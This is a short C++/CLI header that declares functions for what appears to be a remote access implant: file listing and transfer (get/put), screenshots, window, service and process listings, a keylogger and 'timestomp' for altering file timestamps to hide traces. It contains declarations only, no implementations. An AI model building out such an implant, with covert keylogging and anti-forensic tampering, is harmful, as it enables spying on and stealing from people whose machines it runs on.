#pragma once
#include <Windows.h>
#pragma comment(lib, "User32.lib")
#include <strsafe.h>
#include <vector>
#include <tchar.h> 
#include <stdio.h>
#include <string>
#include <regex>
#include <iostream>
#include <vcclr.h>
using namespace System;
using namespace System::IO;
using namespace System::Text;


//System utility functions

int dir(String^ path);
int cd(String^ path);
int screenshot();
int get(String^ rfile);
int put(String^ lfile, String^ rfile);
int timestomp(String^ file);
LPCTSTR* winlist();
LPCTSTR* servlist();
LPCSTR* proclist();

//Enhanced functions
int keylog();